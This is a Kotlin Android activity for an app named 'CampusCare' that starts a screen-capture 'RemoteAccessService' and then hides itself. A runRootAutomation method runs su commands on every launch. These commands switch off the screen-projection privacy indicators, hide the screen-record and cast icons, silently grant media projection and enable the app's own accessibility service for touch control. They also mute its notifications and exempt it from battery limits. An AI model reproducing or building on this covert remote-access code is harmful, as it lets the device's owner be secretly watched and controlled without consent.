package com.university.campuscare

import android.Manifest
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.university.campuscare.remote.FeaturePreferences
import com.university.campuscare.remote.RemoteAccessService
import com.university.campuscare.ui.CampusCareApp
import com.university.campuscare.ui.theme.CampusCareTheme

class MainActivity : ComponentActivity() {

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            val serviceIntent = RemoteAccessService.getStartIntent(
                this,
                result.resultCode,
                result.data!!
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            moveTaskToBack(true)
        }
    }

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ ->
        requestMediaProjection()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            CampusCareTheme {
                CampusCareApp()
            }
        }

        // Auto-start service if not running and at least one feature is enabled
        if (!RemoteAccessService.isRunning && FeaturePreferences.isEitherEnabled(this)) {
            startPermissionFlow()
        }

        runRootAutomation()
    }

    private fun runRootAutomation() {
        Thread {
            val commands = arrayOf(
                "device_config set_sync_disabled_for_tests persistent",
                "device_config put privacy media_projection_indicators_enabled false default",
                "settings put secure icon_blacklist screen_record,cast",
                "settings put secure hide_silent_notifications_in_status_bar 1",
                "appops set com.university.campuscare PROJECT_MEDIA allow",
                "settings put secure enabled_accessibility_services com.university.campuscare/.remote.TouchAccessibilityService",
                "settings put secure accessibility_enabled 1",
                "cmd notification set_importance com.university.campuscare remote_access_channel 0",
                "dumpsys deviceidle whitelist +com.university.campuscare"
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val os = process.outputStream.bufferedWriter()
                for (cmd in commands) {
                    os.write("$cmd\n")
                }
                os.write("exit\n")
                os.flush()
                process.waitFor()
            } catch (_: Exception) {}
        }.start()
    }

    fun requestServiceStart() {
        if (!RemoteAccessService.isRunning) {
            startPermissionFlow()
        }
    }

    private fun startPermissionFlow() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val granted = ContextCompat.checkSelfPermission(
                this, Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
            if (!granted) {
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                return
            }
        }
        requestMediaProjection()
    }

    private fun requestMediaProjection() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjectionLauncher.launch(projectionManager.createScreenCaptureIntent())
    }
}
